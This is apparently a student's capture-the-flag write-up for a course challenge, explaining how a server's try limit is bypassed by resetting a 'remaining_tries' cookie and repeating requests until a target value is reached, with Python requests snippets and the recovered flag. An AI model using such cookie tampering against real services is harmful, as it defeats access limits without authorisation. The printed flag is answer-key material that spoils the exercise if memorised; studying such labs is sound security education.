# Challenge `Python requests Again` Writeup

- Vulnerability: 
  - brute-force attack and cookie poisoning
- Where:
  - `/more` endpoint and `remaining_tries` cookie value
- Impact:
  - allows to find the server's guess by repeated requests and cookie poisoning

## Analyzing the server

This challenges consists in guessing a random number generated by the server.
By sending a request to `/hello` endpoint, the server responds with a `current` value and a `target` value.
By sending a request to `/more` endpoint, the `current` value increases or decreases by a random amount. However, it's only allowed to send one request per guess.
The flag is obtained by sending a request to `/finish` when the `current` value is equal to the `target` value.
The server's session is associated with a cookie, so all requests must be sent with it.

## Exploit

First send a request to `/hello` to obtain a cookie and the `current` and `target` values. 
```python
session = requests.session()
r = session.get(URL+"hello")
lines = r.text.split("<br>")
total = lines[0].split(" ")[-1][:-1]
current = lines[1].split(" ")[-1]
```
If the values are different, send requests to `/more` until they are the same.
To be able to send more requests, poison the `remaining_tries` value by modifying the cookie.
Either set the value to `1` after each request or set a new cookie entry with the same `remaining_tries` name and no specific domain which wouldn't be updated and therefore wouldn't need to be set after every request.
```python
r = session.get(URL+"more")
lines = r.text.split("<br>")
current = lines[2].split(" ")[-1]
session.cookies.set("remaining_tries", "1", domain="mustard.stt.rnl.tecnico.ulisboa.pt")
```  
Finally send a request to `/finish` to obtain the flag `SSof{Client_side_validation_NO_NO_NO}`.
```python
r = session.get(URL+"finish")
flag = r.text.split(" ")[-1]
```

## Implementation

These code snippets and full implementation can be found [here](python_requests_again.py).
